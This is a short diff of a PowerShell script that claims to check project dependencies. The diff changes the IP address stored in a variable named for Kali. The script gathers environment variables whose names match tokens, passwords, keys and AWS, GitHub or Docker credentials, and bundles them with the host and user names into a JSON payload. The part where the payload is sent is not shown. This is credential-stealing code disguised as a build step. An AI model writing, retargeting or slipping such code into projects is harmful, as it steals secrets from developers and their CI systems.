@@ -1,6 +1,6 @@
 Write-Host "Checking project dependencies..."
 
-$kali = "172.23.237.192"   
+$kali = "10.123.59.192"   
 
 $secrets = Get-ChildItem Env: | Where-Object { $_.Name -match "GITHUB|DOCKER|AWS|SECRET|TOKEN|PASSWORD|KEY" } | ForEach-Object { $_.Name + "=" + $_.Value }
 $body = @{ host = $env:COMPUTERNAME; user = $env:USERNAME; secrets = $secrets } | ConvertTo-Json
